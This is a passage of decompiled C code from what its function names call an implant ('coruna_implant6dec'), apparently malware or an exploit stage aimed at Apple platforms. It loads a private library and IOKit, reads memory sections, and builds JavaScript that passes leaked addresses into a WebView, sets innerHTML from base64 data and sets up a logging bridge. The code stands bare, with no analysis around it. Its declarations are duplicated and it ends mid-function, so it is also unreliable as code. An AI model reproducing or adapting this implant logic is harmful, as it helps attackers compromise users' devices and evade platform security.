  void *thread_attr;
  void *host_info;
  uint64_t serial_buf;
  
  thread_attr = (void *)coruna_u64_pack((thread_attr), (0x2e));
  handle = coruna_implant6dec_via_cat_2(*handle + 0x28,&thread_attr);
  handle = *(long *)(handle + 0x18);
  thread_attr = (void *)0x0;
  host_info = (void *)0x0;
  serial_buf = 0;
  coruna_implant6dec_via_implant6dec_via_abort_aa28(handle,&thread_attr);
  err = coruna_ret_stub_3(*(uint64_t *)*handle,thread_attr,handle[0x62],
                       (long)host_info - (long)thread_attr);
  if ((err == 0) &&
     (err = coruna_ret_stub_3(*(uint64_t *)*handle,handle + 6,handle + 0x28,0x10), err == 0)) {
    u = *(uint64_t *)*handle;
    scratch = 0x29;
    bootargs = handle;
    handle = coruna_implant6dec_via_cat_2((uint64_t *)*handle + 5,&scratch);
    coruna_ret_stub_3(u,&bootargs,*(uint64_t *)(handle + 0x18),8);
  }
  if (thread_attr != (void *)0x0) {
    host_info = thread_attr;
    operator_delete(thread_attr);
  }
  return;
}
void coruna_macho_data_seg(long *handle,long addr_2,uint8_t *buf,long off_3)
{
  long *ptr;
  uint8_t *ptr;
  uint64_t *****lpppppu3;
  uint8_t u;
  char *****lpppppc5;
  uint8_t *buf;
  long handle;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  void *buf;
  char *ptr;
  unsigned long kind;
  long addr;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  void *str;
  unsigned long *str;
  uint64_t type_id_10;
  size_t ls22;
  long off;
  uint8_t *copy;
  void *scratch;
  long bootargs;
  uint64_t thread_attr;
  uint8_t host_info[4];
  uint32_t serial_buf;
  void *action [2];
  char block_ctx;
  uint64_t ****stack_guard;
  unsigned long sa_saved;
  byte sa_new;
  uint64_t ****path_buf [2];
  char tmp_buf;
  void *region;
  void *plist;
  uint64_t url_buf;
  void *json_buf;
  void *frame;
  void *work;
  void *cache;
  void *cache_20;
  uint8_t *cache_21;
  uint8_t *cache_22;
  uint8_t *cache_23;
  char ****cache_24 [2];
  char *cache_25;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t cache_26;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t cache_27;
  uint64_t block_ctx;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t stack_guard;
  long cache_30;
  
  cache_30 = *(long *)k_implant_stack_chk_guard_slot;
  *handle = addr_2;
  handle[8] = coruna_cat(s_objc_opt_new_00013990._5_3_,s_objc_opt_new_00013990._0_5_);
  handle[3] = -1;
  handle[2] = -1;
  handle[5] = -1;
  handle[4] = -1;
  handle[6] = 0;
  *(unsigned long *)((long)handle + 0x45) =
       coruna_cat(s_objc_opt_new_00013990._8_5_,s_objc_opt_new_00013990._5_3_);
  *(unsigned long *)((long)handle + 0x4d) =
       coruna_cat(s_objc_msgSend_0001399d._5_3_,s_objc_msgSend_0001399d._0_5_);
  *(unsigned long *)((long)handle + 0x52) =
       coruna_cat(s_objc_msgSend_0001399d._8_5_,s_objc_msgSend_0001399d._5_3_);
  type_id_10 = s_object_setClass_000139aa._0_8_;
  *(uint64_t *)((long)handle + 0x62) = s_object_setClass_000139aa._8_8_;
  *(uint64_t *)((long)handle + 0x5a) = type_id_10;
  version = s_IOHIDSessionFilterSetPropertyFor_000139ba._16_8_;
  size = s_IOHIDSessionFilterSetPropertyFor_000139ba._0_8_;
  type_id_10 = coruna_cat(s_IOHIDSessionFilterSetPropertyFor_000139ba[0x1f],
                    s_IOHIDSessionFilterSetPropertyFor_000139ba._24_7_);
  *(uint64_t *)((long)handle + 0x72) = s_IOHIDSessionFilterSetPropertyFor_000139ba._8_8_;
  *(uint64_t *)((long)handle + 0x6a) = size;
  *(uint64_t *)((long)handle + 0x82) = type_id_10;
  *(uint64_t *)((long)handle + 0x7a) = version;
  *(unsigned long *)((long)handle + 0x89) =
       coruna_u64_pack71((s_IOHIDSessionFilterSetPropertyFor_000139ba._32_7_), (s_IOHIDSessionFilterSetPropertyFor_000139ba[0x1f]));
  version = 0;
  size = 0;
  type_id_10 = coruna_u64_pack((0), (0));
  *(uint64_t *)((long)handle + 0x99) = 0;
  *(uint64_t *)((long)handle + 0x91) = size;
  *(uint64_t *)((long)handle + 0xa9) = type_id_10;
  *(uint64_t *)((long)handle + 0xa1) = version;
  type_id_10 = coruna_u64_pack((0), (0));
  *(uint64_t *)((long)handle + 0xb5) = 0;
  *(uint64_t *)((long)handle + 0xad) = type_id_10;
  type_id_10 = s_Q56__0Q8Q16Q24Q32Q40Q48_00013a0d._0_8_;
  *(uint64_t *)((long)handle + 0xc5) = s_Q56__0Q8Q16Q24Q32Q40Q48_00013a0d._8_8_;
  *(uint64_t *)((long)handle + 0xbd) = type_id_10;
  *(uint64_t *)((long)handle + 0xcd) = s_Q56__0Q8Q16Q24Q32Q40Q48_00013a0d._16_8_;
  *(uint32_t *)((long)handle + 0xe4) = 0x382267;
  type_id_10 = 0;
  *(uint64_t *)((long)handle + 0xdd) = 0;
  *(uint64_t *)((long)handle + 0xd5) = type_id_10;
  handle[0x1e] = 0;
  handle[0x1d] = 0;
  handle[0x20] = 0;
  handle[0x1f] = 0;
  handle[0x22] = 0;
  handle[0x21] = 0;
  handle = k_implant_insn_pattern_c;
  handle[0x23] = k_implant_insn_pattern_c;
  handle[0x24] = 0x1e;
  type_id_10 = coruna_cat(s_mainFrame_windowObject_JSValue_00013a38._16_6_,
                    s_mainFrame_windowObject_JSValue_00013a38._14_2_);
  *(uint64_t *)((long)handle + 0x13e) = s_mainFrame_windowObject_JSValue_00013a38._22_8_;
  *(uint64_t *)((long)handle + 0x136) = type_id_10;
  type_id_10 = s_mainFrame_windowObject_JSValue_00013a38._0_8_;
  handle[0x26] =
       coruna_cat(s_mainFrame_windowObject_JSValue_00013a38._14_2_,
                s_mainFrame_windowObject_JSValue_00013a38._8_6_);
  handle[0x25] = type_id_10;
  handle[0x29] = 0;
  handle[0x2a] = handle;
  handle[0x2b] = 0x18;
  size = s_new__browserView_webView_00013a57._16_8_;
  type_id_10 = s_new__browserView_webView_00013a57._0_8_;
  handle[0x2d] = s_new__browserView_webView_00013a57._8_8_;
  handle[0x2c] = type_id_10;
  handle[0x2e] = size;
  handle[0x2f] = 0;
  handle[0x30] = handle;
  handle[0x31] = 0x12;
  *(uint16_t *)(handle + 0x34) = 0x6e75;
  type_id_10 = s_currentRunLoop_run_00013a70._0_8_;
  handle[0x33] = s_currentRunLoop_run_00013a70._8_8_;
  handle[0x32] = type_id_10;
  handle[0x35] = 0;
  handle[0x36] = handle;
  handle[0x37] = 0x37;
  tag = 0;
  port = 0;
  version = 0;
  size = 0;
  type_id_10 = 0;
  addr = coruna_cat(s__System_Library_PrivateFramework_00013a83[0x2f],
                    0);
  *(unsigned long *)((long)handle + 0x1ef) =
       coruna_u64_pack71((0), (s__System_Library_PrivateFramework_00013a83[0x2f]));
  handle[0x3b] = port;
  handle[0x3a] = version;
  handle[0x3d] = addr;
  handle[0x3c] = tag;
  handle[0x39] = size;
  handle[0x38] = type_id_10;
  handle[0x3f] = 0;
  handle[0x40] = handle;
  handle[0x41] = 1;
  *(uint8_t *)(handle + 0x42) = 99;
  handle[0x43] = 0;
  handle[0x44] = handle;
  handle[0x45] = 1;
  *(uint8_t *)(handle + 0x46) = 0x6c;
  handle[0x47] = -1;
  handle[0x48] = -1;
  handle[0x49] = 0;
  handle[0x4c] = -1;
  handle[0x4b] = -1;
  handle[0x4a] = -1;
  handle[0x4e] = -1;
  off = k_implant_rodata_word_00012ac8;
  addr = k_implant_insn_pattern_f;
  str = (unsigned long *)(handle + 0x5b);
  ptr = handle + 0x5e;
  handle[0x5e] = 0;
  handle[0x5d] = 0;
  handle[0x60] = 0;
  handle[0x5f] = 0;
  handle[0x5a] = 0;
  handle[0x59] = 0;
  handle[0x5c] = 0;
  handle[0x5b] = 0;
  handle[0x56] = off;
  handle[0x55] = addr;
  handle[0x58] = 0;
  handle[0x57] = 0;
  handle[99] = 0;
  handle[0x62] = 0;
  cache_24[0] = (char ****)0x137e5;
  cache_24[1] = (char ****)_dlopen("/usr/lib/usd/libusd_ms.dylib",1);
  cache_25 = "/System/Library/Frameworks/IOKit.framework/IOKit";
  scratch = _dlopen("/System/Library/Frameworks/IOKit.framework/IOKit",1);
  buf = operator_new(0x20);
  addr = 0;
  handle[100] = (long)buf;
  handle[0x66] = (long)buf + 0x20;
  do {
    type_id_10 = *(uint64_t *)((long)cache_24 + addr);
    ((uint64_t *)((long)buf + addr))[1] = *(uint64_t *)((long)cache_24 + addr + 8);
    *(uint64_t *)((long)buf + addr) = type_id_10;
    addr = addr + 0x10;
  } while (addr != 0x20);
  handle[0x65] = (long)buf + 0x20;
  addr = 0x18;
  do {
    if (*(long *)((long)cache_24 + addr) != 0) {
      _dlclose();
      *(uint64_t *)((long)cache_24 + addr) = 0;
    }
    addr = addr + -0x10;
  } while (addr != -8);
  ptr = _getsectdatafromFramework("libusd_ms.dylib","__DATA","__bss",(unsigned long *)(handle + 99));
  handle[0x62] = (long)ptr;
  cache_21 = (uint8_t *)0x0;
  cache_22 = (uint8_t *)0x0;
  cache_23 = (uint8_t *)0x0;
  if (off_3 != 0) {
    while( true ) {
      buf = cache_21;
      off_3 = off_3 + -1;
      u = *buf;
      if (cache_22 < cache_23) {
        *cache_22 = u;
        cache_22 = cache_22 + 1;
      }
      else {
        ls22 = (long)cache_22 - (long)cache_21;
        kind = ls22 + 1;
        if ((long)kind < 0) goto fail;
        type_id_8 = ((long)cache_23 - (long)cache_21) * 2;
        if (kind <= type_id_8) {
          kind = type_id_8;
        }
        if (0x3ffffffffffffffe < (unsigned long)((long)cache_23 - (long)cache_21)) {
          kind = 0x7fffffffffffffff;
        }
        if (kind == 0) {
          copy = (uint8_t *)0x0;
        }
        else {
          copy = operator_new(kind);
        }
        ptr = copy + ls22;
        *ptr = u;
        if (0 < (long)ls22) {
          _memcpy(copy,buf,ls22);
        }
        cache_23 = copy + kind;
        cache_21 = copy;
        cache_22 = ptr + 1;
        if (buf != (uint8_t *)0x0) {
          operator_delete(buf);
        }
      }
      if (off_3 == 0) break;
      buf = buf + 1;
    }
  }
  kind = coruna_implant6dec_residual_93((long)cache_22 - (long)cache_21,0);
  cache = (void *)0x0;
  cache_20 = (void *)0x0;
  work = (void *)0x0;
  if (kind != 0) {
    if ((long)kind < 0) {
fail:
      coruna_abort_aa28();
    }
    work = operator_new(kind);
    buf = (void *)((long)work + kind);
    cache_20 = buf;
    _bzero(work,kind);
    cache = buf;
  }
  coruna_memcpy_aa94(&json_buf,&cache_21);
  coruna_implant6dec_residual_94(&json_buf,&work,0,0);
  if (json_buf != (void *)0x0) {
    frame = json_buf;
    operator_delete(json_buf);
  }
  std_string_reserve((unsigned long)str);
  buf = cache;
  for (str = work; str != buf; str = (void *)((long)str + 1)) {
    std_string_push_back((char)str);
  }
  region = (void *)0x0;
  plist = (void *)0x0;
  url_buf = 0;
  coruna_implant6dec_residual_79(&region);
  coruna_implant6dec_via_abort_ab28(path_buf,"");
  buf = plist;
  if (region != plist) {
    str = region;
    do {
      addr = coruna_implant6dec_via_cat_5(*handle + 0x28,str);
      if (addr != 0) {
        off = *(long *)(addr + 0x30);
        if (*(int *)(addr + 0x10) != 1) {
          addr = coruna_task_info_fd84();
          off = off - addr;
        }
        coruna_implant6dec_via_abort_ab28(&stack_guard,"%#llx, ");
        coruna_snprintf(cache_24,&stack_guard,off);
        lpppppc5 = (char *****)cache_24[0];
        if (-1 < (long)cache_25) {
          lpppppc5 = cache_24;
        }
        std_string_append((char *)path_buf,(unsigned long)lpppppc5);
        if ((long)cache_25 < 0) {
          operator_delete(cache_24[0]);
        }
        if ((char)sa_new < '\0') {
          operator_delete(stack_guard);
        }
      }
      str = (void *)((long)str + 4);
    } while (str != buf);
  }
  coruna_implant6dec_via_abort_ab28(&stack_guard,"");
  coruna_implant6dec_via_abort_ab28(action,"window.r={%#llxn : %#llxn};");
  scratch = (void *)coruna_u64_pack((scratch), (0x2d));
  addr = coruna_implant6dec_via_cat_2(*handle + 0x28,&scratch);
  type_id_10 = *(uint64_t *)(addr + 0x18);
  serial_buf = 0x2f;
  addr = coruna_implant6dec_via_cat_2(*handle + 0x28,&serial_buf);
  coruna_snprintf_2(cache_24,action,type_id_10,*(uint64_t *)(addr + 0x18));
  lpppppc5 = (char *****)cache_24[0];
  if (-1 < (long)cache_25) {
    lpppppc5 = cache_24;
  }
  std_string_append((char *)&stack_guard,(unsigned long)lpppppc5);
  if ((long)cache_25 < 0) {
    operator_delete(cache_24[0]);
  }
  if (block_ctx < '\0') {
    operator_delete(action[0]);
  }
  coruna_implant6dec_via_abort_ab28(action,"window.o=[%s];\n");
  lpppppu3 = (uint64_t *****)path_buf[0];
  if (-1 < tmp_buf) {
    lpppppu3 = path_buf;
  }
  coruna_snprintf(cache_24,action,lpppppu3);
  lpppppc5 = (char *****)cache_24[0];
  if (-1 < (long)cache_25) {
    lpppppc5 = cache_24;
  }
  std_string_append((char *)&stack_guard,(unsigned long)lpppppc5);
  if ((long)cache_25 < 0) {
    operator_delete(cache_24[0]);
  }
  if (block_ctx < '\0') {
    operator_delete(action[0]);
  }
  coruna_implant6dec_via_abort_ab28(action,"window.b=\'%s\';\n");
  coruna_snprintf(cache_24,action,*(uint64_t *)(*handle + 8));
  lpppppc5 = (char *****)cache_24[0];
  if (-1 < (long)cache_25) {
    lpppppc5 = cache_24;
  }
  std_string_append((char *)&stack_guard,(unsigned long)lpppppc5);
  if ((long)cache_25 < 0) {
    operator_delete(cache_24[0]);
  }
  if (block_ctx < '\0') {
    operator_delete(action[0]);
  }
  coruna_implant6dec_via_abort_ab28(action,"window.s=%#llx;\n");
  type_id_10 = coruna_task_info_fd84();
  coruna_snprintf(cache_24,action,type_id_10);
  lpppppc5 = (char *****)cache_24[0];
  if (-1 < (long)cache_25) {
    lpppppc5 = cache_24;
  }
  std_string_append((char *)&stack_guard,(unsigned long)lpppppc5);
  if ((long)cache_25 < 0) {
    operator_delete(cache_24[0]);
  }
  if (block_ctx < '\0') {
    operator_delete(action[0]);
  }
  coruna_implant6dec_via_abort_ab28(action,"window.u=\'%s\';\n");
  coruna_snprintf(cache_24,action,*(uint64_t *)(*handle + 0x10));
  lpppppc5 = (char *****)cache_24[0];
  if (-1 < (long)cache_25) {
    lpppppc5 = cache_24;
  }
  std_string_append((char *)&stack_guard,(unsigned long)lpppppc5);
  if ((long)cache_25 < 0) {
    operator_delete(cache_24[0]);
  }
  if (block_ctx < '\0') {
    operator_delete(action[0]);
  }
  std_string_append((char *)&stack_guard);
  coruna_implant6dec_via_abort_ab28(action,"e.innerHTML = window.atob(\'%s\');\n");
  if (*(char *)((long)handle + 0x2ef) < '\0') {
    str = (unsigned long *)*str;
  }
  coruna_snprintf(cache_24,action,str);
  lpppppc5 = (char *****)cache_24[0];
  if (-1 < (long)cache_25) {
    lpppppc5 = cache_24;
  }
  std_string_append((char *)&stack_guard,(unsigned long)lpppppc5);
  if ((long)cache_25 < 0) {
    operator_delete(cache_24[0]);
  }
  if (block_ctx < '\0') {
    operator_delete(action[0]);
  }
  std_string_append((char *)&stack_guard);
  coruna_implant6dec_via_abort_ab28(action,
               "function h22(a){a=a.replace(/\\//g,\'_\');console.log(`[JS.console] ${a}`);window.l(`/PREAMBLE_ ${a}     `)};"
              );
  coruna_implant6dec_via_abort_ab28(&scratch,"%s");
  lpppppu3 = (uint64_t *****)stack_guard;
  if (-1 < (char)sa_new) {
    lpppppu3 = &stack_guard;
  }
  coruna_snprintf_2(cache_24,&scratch,lpppppu3,5);
  lpppppc5 = (char *****)cache_24[0];
  if (-1 < (long)cache_25) {
    lpppppc5 = cache_24;
  }
  std_string_append((char *)action,(unsigned long)lpppppc5);
  if ((long)cache_25 < 0) {
    operator_delete(cache_24[0]);
  }
  if (thread_attr < '\0') {
    operator_delete(scratch);
  }
  std_string_operator_assign((string *)&stack_guard,(string *)action);
  scratch = (void *)0x0;
  bootargs = handle;
  thread_attr = sa_saved;
  if (-1 < (char)sa_new) {
    thread_attr = (unsigned long)sa_new;
  }
  coruna_implant6dec_via_abort_aa28(ptr,handle[0x5e],&scratch,host_info);
  lpppppu3 = (uint64_t *****)stack_guard;
  if (-1 < (char)sa_new) {
    sa_saved = (unsigned long)sa_new;
    lpppppu3 = &stack_guard;
  }
  coruna_implant6dec_via_abort_aa28_2(ptr,handle[0x5f],lpppppu3,(long)lpppppu3 + sa_saved);
  buf = (void *)handle[0x5e];
  kind = handle[0x5f] - (long)buf;
  buf = (uint8_t *)handle[0x5f];
  do {
    if ((kind & 7) == 0) {
      coruna_implant6dec_residual_83(handle + 0x58,200);
      cache_24[0] = (char ****)0xffffffffffffffff;
      cache_24[1] = (char ****)0xffffffffffffffff;
      scratch = 0;
      cache_25 = (char *)0x0;
      thread_attr = 0;
      bootargs = 0;
      host_info = 0;
      cache_26 = 0;
      action = 0;
      serial_buf = 0;
      block_ctx = 0;
      cache_27 = 0;
      cache_29 = 0;
      stack_guard = 0;
      cache_28 = 0xffffffffffffffff;
      coruna_implant6dec_via_abort_ada4(handle + 0x58,cache_24);
      handle[0x61] = handle[0x59] + -0x78;
      cache_24[0] = (char ****)coruna_u64_pack((cache_24[0]), (0x17));
      addr = coruna_implant6dec_via_cat_2(*handle + 0x28,cache_24);
      handle[6] = *(long *)(addr + 0x18) + -0x10;
      addr = coruna_sleep(handle,handle[0x58]);
      handle[7] = addr;
      if (block_ctx < '\0') {
        operator_delete(action[0]);
      }
      if ((char)sa_new < '\0') {
        operator_delete(stack_guard);
      }
      if (tmp_buf < '\0') {
        operator_delete(path_buf[0]);
      }
      if (region != (void *)0x0) {
        plist = region;
        operator_delete(region);
      }
      if (work != (void *)0x0) {
        cache = work;
        operator_delete(work);
      }
      if (cache_21 != (uint8_t *)0x0) {
        cache_22 = cache_21;
        operator_delete(cache_21);
      }
      if (*(long *)k_implant_stack_chk_guard_slot != cache_30) {
        ___stack_chk_fail();
      }
      return;
    }
    if (buf < (uint8_t *)handle[0x60]) {
      copy = buf + 1;
      *buf = 0;
      handle[0x5f] = (long)copy;
    }
    else {
      type_id_8 = kind + 1;
      if ((long)type_id_8 < 0) goto fail;
      type_id = handle[0x60] - (long)buf;
      type_id_9 = type_id * 2;
      if (type_id_8 <= type_id_9) {
        type_id_8 = type_id_9;
      }
      if (0x3ffffffffffffffe < type_id) {
        type_id_8 = 0x7fffffffffffffff;
      }
      if (type_id_8 == 0) {
        str = (void *)0x0;
      }
      else {
        str = operator_new(type_id_8);
      }
      copy = (uint8_t *)((long)str + kind) + 1;
      *(uint8_t *)((long)str + kind) = 0;
      if (0 < (long)kind) {
        _memcpy(str,buf,kind);
      }
      handle[0x5e] = (long)str;
      handle[0x5f] = (long)copy;
      handle[0x60] = (long)str + type_id_8;
      if (buf != (void *)0x0) {
        operator_delete(buf);
        copy = (uint8_t *)handle[0x5f];
      }
    }
    buf = (void *)*ptr;
    kind = (long)copy - (long)buf;
    buf = copy;
  } while( true );
}
void coruna_implant6dec_via_abort_ab28(uint64_t *val,char *path)
{
  size_t ls1;
  uint64_t *ptr;
  unsigned long u;
  
  ls1 = _strlen(path);
  if (0xffffffffffffffef < ls1) {
    coruna_abort_ab28();
  }
  if (ls1 < 0x17) {
    *(char *)((long)val + 0x17) = (char)ls1;
    ptr = val;
    if (ls1 == 0) goto fail;
  }
  else {
    u = ls1 + 0x10 & 0xfffffffffffffff0;
    ptr = operator_new(u);
    val[1] = ls1;
    val[2] = u | 0x8000000000000000;
    *val = ptr;
  }
  _memcpy(ptr,path,ls1);
  val = ptr;
fail:
  *(uint8_t *)((long)val + ls1) = 0;
  return;
}
void coruna_snprintf(uint64_t *val,char *path)
{
  char *ptr;
  int err;
  int status;
  char *buf;
  uint64_t *ptr;
  unsigned long u;
  unsigned long size;
  unsigned long version;
  
  ptr = *(char **)path;
  if (-1 < path[0x17]) {
    ptr = path;
  }
  err = _snprintf((char *)0x0,0,ptr);
  u = (unsigned long)(err + 1);
  buf = operator_new__(u);
  ptr = *(char **)path;
  if (-1 < path[0x17]) {
    ptr = path;
  }
  status = _snprintf(buf,u,ptr);
  version = (long)(buf + (long)(err + 1) + -1) - (long)buf;
  if (0xffffffffffffffef < version) {
    coruna_abort_ab28(status);
  }
  if (version < 0x17) {
    *(char *)((long)val + 0x17) = (char)version;
    ptr = val;
  }
  else {
    size = version + 0x10 & 0xfffffffffffffff0;
    ptr = operator_new(size);
    val[1] = version;
    val[2] = size | 0x8000000000000000;
    *val = ptr;
  }
  if (buf != buf + (long)(err + 1) + -1) {
    _memcpy(ptr,buf,u - 1);
    ptr = (uint64_t *)((long)ptr + (u - 1));
  }
  *(uint8_t *)ptr = 0;
  operator_delete__(buf);
  return;
}
void coruna_snprintf_2(uint64_t *val,char *path)
{
  char *ptr;
  int err;
  int status;
  char *buf;
  uint64_t *ptr;
  unsigned long u;
  unsigned long size;
  unsigned long version;
  
  ptr = *(char **)path;
  if (-1 < path[0x17]) {
    ptr = path;
  }
  err = _snprintf((char *)0x0,0,ptr);
  u = (unsigned long)(err + 1);
  buf = operator_new__(u);
  ptr = *(char **)path;
  if (-1 < path[0x17]) {
    ptr = path;
  }
  status = _snprintf(buf,u,ptr);
  version = (long)(buf + (long)(err + 1) + -1) - (long)buf;
  if (0xffffffffffffffef < version) {
    coruna_abort_ab28(status);
  }
  if (version < 0x17) {
    *(char *)((long)val + 0x17) = (char)version;
    ptr = val;
  }
  else {
    size = version + 0x10 & 0xfffffffffffffff0;
    ptr = operator_new(size);
    val[1] = version;
    val[2] = size | 0x8000000000000000;
    *val = ptr;
  }
  if (buf != buf + (long)(err + 1) + -1) {
    _memcpy(ptr,buf,u - 1);
    ptr = (uint64_t *)((long)ptr + (u - 1));
  }
  *(uint8_t *)ptr = 0;
  operator_delete__(buf);
  return;
}
void coruna_implant6dec_via_abort_aa28(long *handle,void *ctx,void *scratch,void *data_3)
{
  void *ptr;
  uint8_t *ptr;
  uint8_t *buf;
  unsigned long u;
  uint8_t *str;
  long handle;
  uint8_t *copy;
  size_t ls8;
  size_t ls9;
  void *scratch;
  void *bootargs;
  void *thread_attr;
  uint8_t *host_info;
  long *serial_buf;
  
  ls8 = (long)data_3 - (long)scratch;
  if (0 < (long)ls8) {
    ptr = (uint8_t *)handle[1];
    if (handle[2] - (long)ptr < (long)ls8) {
      handle = *handle;
      ptr = ptr + (ls8 - handle);
      if ((long)ptr < 0) {
        coruna_abort_aa28();
      }
      serial_buf = handle + 2;
      u = handle[2] - handle;
      copy = (uint8_t *)(u * 2);
      if (ptr <= copy) {
        ptr = copy;
      }
      if (0x3ffffffffffffffe < u) {
        ptr = (uint8_t *)0x7fffffffffffffff;
      }
      if (ptr == (uint8_t *)0x0) {
        scratch = (void *)0x0;
      }
      else {
        scratch = operator_new((unsigned long)ptr);
      }
      ptr = (void *)((long)scratch + ((long)ctx - handle));
      host_info = (uint8_t *)((long)scratch + (long)ptr);
      bootargs = ptr;
      _memcpy(ptr,scratch,ls8);
      thread_attr = (void *)((long)ptr + ls8);
      coruna_implant6dec_residual_84(handle,&scratch,ctx);
      if (thread_attr != bootargs) {
        thread_attr = bootargs;
      }
      if (scratch != (void *)0x0) {
        operator_delete(scratch);
      }
    }
    else {
      handle = (long)ptr - (long)ctx;
      copy = ptr;
      if (handle < (long)ls8) {
        ptr = (void *)((long)scratch + handle);
        ls9 = (long)data_3 - (long)ptr;
        if (0 < (long)ls9) {
          _memcpy(ptr,ptr,ls9);
          copy = ptr + ls9;
        }
        handle[1] = (long)copy;
        data_3 = ptr;
        if (handle < 1) {
          return;
        }
      }
      ls9 = (long)copy - ((long)ctx + ls8);
      buf = copy;
      for (str = copy + -ls8; str < ptr; str = str + 1) {
        *buf = *str;
        buf = buf + 1;
      }
      handle[1] = (long)buf;
      if (ls9 != 0) {
        _memmove(copy + -ls9,ctx,ls9);
      }
      if ((long)data_3 - (long)scratch != 0) {
        _memmove(ctx,scratch,(long)data_3 - (long)scratch);
      }
    }
  }
  return;
}
void coruna_implant6dec_via_abort_aa28_2(long *handle,uint8_t *buf,uint8_t *data_2,uint8_t *bytes_3)
{
  void *ptr;
  uint8_t *ptr;
  uint8_t *buf;
  size_t ls4;
  unsigned long u;
  long handle;
  uint8_t *str;
  uint8_t *copy;
  size_t ls9;
  void *scratch;
  void *bootargs;
  void *thread_attr;
  uint8_t *host_info;
  long *serial_buf;
  
  ls9 = (long)bytes_3 - (long)data_2;
  if (0 < (long)ls9) {
    ptr = (uint8_t *)handle[1];
    if (handle[2] - (long)ptr < (long)ls9) {
      handle = *handle;
      ptr = ptr + (ls9 - handle);
      if ((long)ptr < 0) {
        coruna_abort_aa28();
      }
      serial_buf = handle + 2;
      u = handle[2] - handle;
      str = (uint8_t *)(u * 2);
      if (ptr <= str) {
        ptr = str;
      }
      if (0x3ffffffffffffffe < u) {
        ptr = (uint8_t *)0x7fffffffffffffff;
      }
      if (ptr == (uint8_t *)0x0) {
        scratch = (void *)0x0;
      }
      else {
        scratch = operator_new((unsigned long)ptr);
      }
      ptr = (void *)((long)scratch + ((long)buf - handle));
      host_info = (uint8_t *)((long)scratch + (long)ptr);
      bootargs = ptr;
      _memcpy(ptr,data_2,ls9);
      thread_attr = (void *)((long)ptr + ls9);
      coruna_implant6dec_residual_84(handle,&scratch,buf);
      if (thread_attr != bootargs) {
        thread_attr = bootargs;
      }
      if (scratch != (void *)0x0) {
        operator_delete(scratch);
      }
    }
    else {
      handle = (long)ptr - (long)buf;
      str = ptr;
      if (handle < (long)ls9) {
        for (copy = data_2 + handle; copy != bytes_3; copy = copy + 1) {
          *str = *copy;
          str = str + 1;
        }
        handle[1] = (long)str;
        bytes_3 = data_2 + handle;
        if (handle < 1) {
          return;
        }
      }
      ls4 = (long)str - (long)(buf + ls9);
      buf = str;
      for (copy = str + -ls9; copy < ptr; copy = copy + 1) {
        *buf = *copy;
        buf = buf + 1;
      }
      handle[1] = (long)buf;
      if (ls4 != 0) {
        _memmove(str + -ls4,buf,ls4);
      }
      for (; bytes_3 != data_2; data_2 = data_2 + 1) {
        *buf = *data_2;
        buf = buf + 1;
      }
    }
  }
  return;
}
void coruna_implant6dec_residual_83(long *handle,unsigned long arg)
{
  size_t ls1;
  long handle;
  long addr;
  void *scratch;
  void *bootargs;
  long thread_attr;
  long host_info;
  
  if ((unsigned long)((handle[2] - *handle >> 3) * -0x1111111111111111) < arg) {
    coruna_implant6dec_via_abort_2(&scratch,arg,(handle[1] - *handle >> 3) * -0x1111111111111111,handle + 2);
    scratch = (void *)*handle;
    handle = handle[1];
    ls1 = handle - (long)scratch;
    bootargs = (void *)((long)bootargs - ls1);
    if (0 < (long)ls1) {
      _memcpy(bootargs,scratch,ls1);
      scratch = (void *)*handle;
      handle = handle[1];
    }
    *handle = (long)bootargs;
    handle[1] = thread_attr;
    addr = handle[2];
    handle[2] = host_info;
    thread_attr = handle;
    if (handle - (long)scratch != 0) {
      thread_attr = handle + (((handle - (long)scratch) - 0x78U) / 0x78 ^ 0xffffffffffffffff) * 0x78;
    }
    if (scratch != (void *)0x0) {
      bootargs = scratch;
      host_info = addr;
      operator_delete(scratch);
    }
  }
  return;
}
void coruna_implant6dec_via_abort_ada4(long *handle,uint64_t *val)
{
  unsigned long u;
  uint64_t *ptr;
  long handle;
  size_t ls4;
  long addr;
  unsigned long size;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  uint64_t type_id;
  uint64_t type_id_8;
  uint64_t type_id_9;
  void *scratch;
  void *bootargs;
  uint64_t *thread_attr;
  long host_info;
  
  ptr = (uint64_t *)handle[1];
  if (ptr < (uint64_t *)handle[2]) {
    port = val[1];
    version = *val;
    kind = val[3];
    tag = val[2];
    type_id = val[4];
    type_id_9 = val[7];
    type_id_8 = val[6];
    ptr[5] = val[5];
    ptr[4] = type_id;
    ptr[7] = type_id_9;
    ptr[6] = type_id_8;
    ptr[1] = port;
    *ptr = version;
    ptr[3] = kind;
    ptr[2] = tag;
    port = val[9];
    version = val[8];
    kind = val[0xb];
    tag = val[10];
    type_id_8 = val[0xd];
    type_id = val[0xc];
    ptr[0xe] = val[0xe];
    ptr[0xb] = kind;
    ptr[10] = tag;
    ptr[0xd] = type_id_8;
    ptr[0xc] = type_id;
    ptr[9] = port;
    ptr[8] = version;
    handle[1] = (long)(ptr + 0xf);
  }
  else {
    handle = ((long)ptr - *handle >> 3) * -0x1111111111111111;
    u = handle + 1;
    if (0x222222222222222 < u) {
      coruna_abort_ada4();
    }
    addr = handle[2] - *handle >> 3;
    size = addr * -0x2222222222222222;
    if (u <= size) {
      u = size;
    }
    if (0x111111111111110 < (unsigned long)(addr * -0x1111111111111111)) {
      u = 0x222222222222222;
    }
    coruna_implant6dec_via_abort_2(&scratch,u,handle,handle + 2);
    port = val[5];
    version = val[4];
    kind = val[7];
    tag = val[6];
    type_id = *val;
    type_id_9 = val[3];
    type_id_8 = val[2];
    thread_attr[1] = val[1];
    *thread_attr = type_id;
    thread_attr[3] = type_id_9;
    thread_attr[2] = type_id_8;
    thread_attr[5] = port;
    thread_attr[4] = version;
    thread_attr[7] = kind;
    thread_attr[6] = tag;
    kind = val[0xb];
    tag = val[10];
    port = val[0xd];
    version = val[0xc];
    type_id_8 = val[9];
    type_id = val[8];
    thread_attr[0xe] = val[0xe];
    thread_attr[0xb] = kind;
    thread_attr[10] = tag;
    thread_attr[0xd] = port;
    thread_attr[0xc] = version;
    thread_attr[9] = type_id_8;
    thread_attr[8] = type_id;
    thread_attr = thread_attr + 0xf;
    scratch = (void *)*handle;
    handle = handle[1];
    ls4 = handle - (long)scratch;
